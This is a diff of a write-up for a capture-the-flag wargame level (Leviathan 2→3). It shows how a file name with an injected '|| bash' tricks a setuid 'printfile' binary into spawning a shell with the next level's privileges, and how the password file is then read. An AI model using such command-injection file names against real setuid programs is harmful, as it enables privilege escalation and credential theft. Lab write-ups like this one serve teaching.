@@ -17,13 +17,19 @@ ltrace ./printfile /etc/passwd
 ```
 
 ![](1.png)
+ 
+```
+touch '/tmp/wow.txt || bash'
+```
+```
+./printfile '/tmp/wow.txt || bash'
+```
 
-```
-touch '/tmp/file.txt || bash'
-```
-```
-./printfile '/tmp/file.txt || bash'
-```
+* `access()` **can** access the file `'/tmp/wow.txt || bash'`
+    * because we created this file in **leviathan2** permissions.
+* but `system()` running this code: `cat /tmp/wow.txt || bash`
+    * **there is not** file named `/tmp/wow.txt`, so `bash` command is running in **leviathan3** permissions.
+
 
 ![](2.png)
 
@@ -34,7 +40,7 @@ cat /etc/leviathan_pass/leviathan3
 exit
 ```
 ```
-rm '/tmp/file.txt || bash'
+rm '/tmp/wow.txt || bash'
 ```
 
 ## Password for the next level:
